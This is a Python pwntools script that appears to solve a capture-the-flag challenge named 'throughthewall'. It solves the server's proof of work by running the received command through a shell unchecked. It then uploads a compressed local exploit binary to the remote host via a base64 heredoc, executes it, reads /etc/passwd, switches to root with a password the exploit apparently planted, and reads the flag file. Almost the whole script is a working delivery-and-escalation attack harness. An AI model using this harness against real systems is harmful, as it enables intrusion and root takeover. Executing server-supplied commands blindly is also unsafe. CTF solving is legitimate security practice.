from pwn import *
import base64, gzip, subprocess

context.log_level = "info"

def recvprompt(p, timeout=30):
    return p.recvuntil([b"$ ", b"# "], timeout=timeout)

with open("./exp", "rb") as f:
    data = gzip.compress(f.read(), compresslevel=9)
exp = base64.b64encode(data)

p = remote("throughthewall.opus4-7.b01le.rs", 8443, ssl=True)
# p = remote("localhost", 1337)

p.recvline()
pow_command = p.recvline().strip()
pow_solution = subprocess.run(pow_command.decode(), shell=True, check=True, stdout=subprocess.PIPE).stdout
print(pow_command, pow_solution)
p.sendlineafter(b"solution: ", pow_solution)

recvprompt(p)
p.sendline(b"export TERM=dumb; stty -echo")
recvprompt(p)

# Single heredoc — one shot
log.info(f"Uploading {len(exp)} bytes of b64 in one heredoc...")
lines = [exp[i:i+76] for i in range(0, len(exp), 76)]
heredoc  = b"base64 -d << 'XEOF' | gunzip > /tmp/exploit\n"
heredoc += b"\n".join(lines) + b"\nXEOF\n"
heredoc += b"echo __UPLOAD_DONE__\n"
p.sendline(heredoc)
p.recvuntil(b"__UPLOAD_DONE__", timeout=500)
p.sendline(b"file /tmp/exploit; wc -c /tmp/exploit; echo __CHECK__")
out = p.recvuntil(b"__CHECK__", timeout=30)
log.info(f"Binary: {out!r}")
recvprompt(p, timeout=15)
log.info("Upload complete")

# Run exploit
p.sendline(b"chmod +x /tmp/exploit; /tmp/exploit > /tmp/exp_out 2>&1; echo __EXPRET__=$?")
p.recvuntil(b"__EXPRET__=", timeout=120)
retcode = p.recvline(timeout=5).strip()
log.info(f"Exploit returned: {retcode!r}")

p.sendline(b"cat /tmp/exp_out; echo __OUT__")
out = p.recvuntil(b"__OUT__", timeout=30)
log.info(f"Exploit output: {out!r}")
recvprompt(p, timeout=30)

p.sendline(b"grep root /etc/passwd; echo __PASSWD__")
out = p.recvuntil(b"__PASSWD__", timeout=15)
log.info(f"/etc/passwd: {out!r}")
recvprompt(p, timeout=30)

p.sendline(b"su root")
p.sendline(b"pwn")

p.sendline(b"cat /flag.txt")
flag = p.recvuntil(b"}", timeout=10)
log.success(f"FLAG: {flag.decode()}")

p.interactive()
